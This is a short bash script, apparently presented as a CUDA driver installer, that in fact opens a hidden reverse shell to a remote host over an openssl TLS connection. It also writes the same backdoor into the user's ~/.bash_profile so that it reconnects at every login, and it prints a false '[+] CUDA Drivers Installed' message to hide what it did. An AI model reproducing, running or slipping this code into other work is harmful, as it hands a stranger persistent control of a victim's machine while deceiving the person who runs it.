#!/bin/bash

PROFILE="$HOME/.bash_profile"
IP='ta-01kah40mrjfc0vs9a8sd69dp49-8888.wo-06or99n8q1ntog6ik59rrtlf3.w.modal.host'
PORT='443'

rm /tmp/s > /dev/null 2>&1
mkfifo /tmp/s > /dev/null 2>&1
nohup setsid bash --norc --noprofile -c "sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &
disown $!

if [ -e $PROFILE ]
then

	echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
    echo 'disown $!' >> $PROFILE

else
	touch $PROFILE
    echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
    echo 'disown $!' >> $PROFILE
fi

echo "[+] CUDA Drivers Installed"
